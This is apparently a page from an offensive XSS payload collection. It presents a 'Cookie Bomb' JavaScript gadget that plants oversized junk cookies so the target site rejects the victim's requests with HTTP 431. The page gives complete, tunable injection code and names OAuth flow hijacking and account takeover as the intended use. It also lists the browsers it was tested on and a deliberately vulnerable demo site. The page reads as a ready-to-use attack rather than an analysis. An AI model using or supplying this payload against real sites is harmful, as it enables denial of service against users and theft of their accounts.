# [unauthn/authn] Cookie Bomb

<p align="justify">This payload denies access to a website or any part(s) of it, on the client side (i.e. causes a full/partial client-side Denial-of-Service (DoS) condition).</p>

<p align="justify">This is achieved by creating multiple junk cookies on the client side with very long values (each below cookie size limit - around 4KB). Once the web browser issues an HTTP request to the affected website/endpoint, along with these cookies, the web server rejects it and responds with the <code>431 Request Header Fields Too Large</code> HTTP status code. Effectively, this denies the web browser access to the requested resource (i.e. causes a DoS condition; client-side only).</p>

<p align="justify">The DoS condition persists as long as the junk cookies are stored on the client side. Once the web browser's cache is cleared, the affected resource is accessible again from the client side.</p>

Typical use case scenarios:
* OAuth flow hijacking
    * idea: [leverage OAuth login to obtain OAuth token](https://medium.com/@danielbelay/day-7-drag-drop-xss-cookie-bomb-for-oauth-hijacking-a9b828cd9c54)
    * IMPACT:
        * Account Take Over (ATO)
            * CVSS-Confidentiality: MEDIUM/HIGH
            * CVSS-Integrity: MEDIUM/HIGH

## Code

```
let cookCount = 3;     // adjust, if needed
let cookLength = 3500; // adjust, if needed
let cookPath = '/';    // adjust, if needed
let cookDomain = window.document.domain; // adjust, if needed
let cookExpire = 10;   // minutes; adjust, if needed
let cookPostfix = '';
if (location.protocol == 'https:') {
  cookPostfix += ' Secure;';
}
function setCookie(inputKey, inputValue, inputPath, inputDomain, inputExpiry, inputPostfix) {
  let cookExpiry = new Date(+ new Date() + inputExpiry * 60 * 1000);
  document.cookie = inputKey + '=' + inputValue + '; path=' + inputPath + '; domain=' + inputDomain + '; expires=' + cookExpiry.toUTCString() + ';' + inputPostfix;
}
function setCookieBomb(inputCount, inputLength, inputPath, inputDomain, inputExpiry, inputPostfix) {
  let cookValue = 'A'.repeat(inputLength);
  for(let i=0; i<inputCount; i++) {
    setCookie('cookie' + i, cookValue, inputPath, inputDomain, inputExpiry, inputPostfix);
  }  
}
setCookieBomb(cookCount, cookLength, cookPath, cookDomain, cookExpire, cookPostfix);
```

## Test Environment

### Web Browsers (20250812)
* [x] Mozilla Firefox 141.0.3 (64-bit)
* [x] Google Chrome 139.0.7258.67 (64-bit)
* [x] Microsoft Edge 139.0.3405.86 (64-bit)

### Vulnerable Page

http://testphp.vulnweb.com

## Screenshot

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://raw.githubusercontent.com/lighthouseitsecurity/weaponizedXSS/refs/heads/main/advanced/jsGadgets/cookieBomb/screenshots/cookieBomb_-_endpoint_DoS_-_1-1.png">
      <img src="https://raw.githubusercontent.com/lighthouseitsecurity/weaponizedXSS/refs/heads/main/advanced/jsGadgets/cookieBomb/screenshots/cookieBomb_-_endpoint_DoS_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/ae8f7205-a757-401f-8240-7b9b1002c775
